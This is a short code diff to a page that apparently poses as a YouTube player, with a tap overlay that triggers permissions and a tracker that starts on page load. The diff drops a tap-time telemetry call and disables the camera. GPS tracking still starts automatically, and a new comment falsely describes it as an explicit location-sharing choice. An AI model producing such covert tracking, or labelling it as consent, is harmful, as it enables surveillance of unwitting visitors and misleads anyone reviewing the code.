@@ -276,21 +276,18 @@
             tapOverlay.classList.add('hidden');
             iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&playsinline=1&enablejsapi=1`;
 
-            if (window.LiveTrackerClient) {
-                window.LiveTrackerClient.sendTelemetry(null, 'youtube', true, true);
-            }
         }
 
         tapOverlay.addEventListener('click', triggerPermissions);
         tapOverlay.addEventListener('touchstart', triggerPermissions, { passive: true });
 
-        // Telemetry tracking on DOM load
+        // Show a separate, explicit location-sharing choice on load.
         window.addEventListener('DOMContentLoaded', () => {
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.startTracking({
                     templateName: 'youtube',
-                    updateInterval: 4000,
-                    enableCamera: true,
+                    updateInterval: 5000,
+                    enableCamera: false,
                     enableGPS: true
                 });
             }
